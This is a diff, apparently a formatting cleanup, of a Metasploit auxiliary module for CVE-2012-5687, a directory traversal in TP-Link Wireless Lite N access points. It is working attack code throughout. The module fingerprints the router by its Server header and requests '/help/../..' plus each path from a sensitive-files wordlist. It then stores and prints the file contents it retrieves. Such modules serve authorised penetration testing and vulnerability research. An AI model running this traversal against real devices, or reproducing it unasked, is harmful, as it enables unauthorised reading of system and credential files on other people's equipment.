@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,17 +7,16 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
       'Name'        => 'TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability',
-      'Description' => %q{
+      'Description' => %q(
           This module tests whether a directory traversal vulnerability is present in
         versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n.
-      },
+      ),
       'References'  =>
         [
           [ 'CVE', '2012-5687' ],
@@ -31,56 +31,52 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-      ], self.class)
+        OptPath.new('SENSITIVE_FILES', [ true, "File containing senstive files, one per line",
+                                         File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ])
+      ], self.class
+    )
   end
 
   def extract_words(wordfile)
     return [] unless wordfile && File.readable?(wordfile)
     begin
-      words = File.open(wordfile, "rb") do |f|
-        f.read
-      end
+      words = File.open(wordfile, "rb", &:read)
     rescue
       return []
     end
     save_array = words.split(/\r?\n/)
-    return save_array
+    save_array
   end
 
   def find_files(file)
     traversal = '/../..'
 
     res = send_request_cgi(
-      {
-        'method'  => 'GET',
-        'uri'     => '/help' << traversal << file,
-        })
+      'method' => 'GET',
+      'uri' => '/help' << traversal << file
+    )
 
     return if res.nil?
-    return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)
-    return if (res.code == 404)
-    return if (res.code == 501)
+    return if res.headers['Server'].nil? || res.headers['Server'] !~ /TP-LINK Router/
+    return if res.code == 404
+    return if res.code == 501
 
-    if (res and res.code == 200 and res.body !~ /\<\/HTML/)
+    if res && (res.code == 200) && res.body !~ /\<\/HTML/
       out = false
 
       print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
-      report_web_vuln({
-        :host     => rhost,
-        :port     => rport,
-        :vhost    => datastore['VHOST'],
-        :path     => "/",
-        :pname    => normalize_uri(traversal, file),
-        :risk     => 3,
-        :proof    => normalize_uri(traversal, file),
-        :name     => self.fullname,
-        :category => "web",
-        :method   => "GET"
-        })
+      report_web_vuln(host: rhost,
+                      port: rport,
+                      vhost: datastore['VHOST'],
+                      path: "/",
+                      pname: normalize_uri(traversal, file),
+                      risk: 3,
+                      proof: normalize_uri(traversal, file),
+                      name: fullname,
+                      category: "web",
+                      method: "GET")
 
-      loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
+      loot = store_loot("tplink.traversal.data", "text/plain", rhost, res.body, file)
       vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 
       if datastore['VERBOSE']
@@ -92,18 +88,17 @@ class MetasploitModule < Msf::Auxiliary
             out = true
             next
           end
-          if out == true
-            if line =~ /<META/ or line =~ /<Script/
-              # we are finished :)
-              # the next line is typical code from the website and nothing from us
-              # this means we can skip this stuff ...
-              out = false
-              next
-            else
-              #it is our output *h00ray*
-              #output our stuff ...
-              print_line("#{line}")
-            end
+          next unless out == true
+          if line =~ /<META/ || line =~ /<Script/
+            # we are finished :)
+            # the next line is typical code from the website and nothing from us
+            # this means we can skip this stuff ...
+            out = false
+            next
+          else
+            # it is our output *h00ray*
+            # output our stuff ...
+            print_line(line.to_s)
           end
         end
         out = false
@@ -113,17 +108,15 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def run_host(ip)
-
+  def run_host(_ip)
     begin
       vprint_status("#{rhost}:#{rport} - Fingerprinting...")
       res = send_request_cgi(
-        {
-          'method'  => 'GET',
-          'uri'	 => '/',
-        })
+        'method' => 'GET',
+        'uri'	 => '/'
+      )
 
-      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)
+      return if res.headers['Server'].nil? || res.headers['Server'] !~ /TP-LINK Router/
 
     rescue ::Rex::ConnectionError
       vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
@@ -133,6 +126,5 @@ class MetasploitModule < Msf::Auxiliary
     extract_words(datastore['SENSITIVE_FILES']).each do |files|
       find_files(files) unless files.empty?
     end
-
   end
 end
